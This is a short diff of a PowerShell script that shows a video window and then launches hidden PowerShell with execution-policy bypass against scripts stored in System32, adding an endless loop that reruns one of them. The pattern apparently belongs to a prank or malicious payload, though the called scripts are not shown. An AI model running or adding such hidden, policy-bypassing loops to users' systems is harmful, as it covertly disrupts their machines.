@@ -32,4 +32,6 @@ $VideoPlayer.Play()
 #Show Up the Window 
 $Window.ShowDialog() | out-null
 
-powershell -w h -Exec Bypass C:\Windows\System32\rr\fb.ps1;'while (1) { C:\Windows\System32\rr\rr.ps1; }'
+powershell -w h -Exec Bypass C:\Windows\System32\rr\fb.ps1;
+
+while (1) { powershell -w h -Exec Bypass C:\Windows\System32\rr\rr.ps1; }
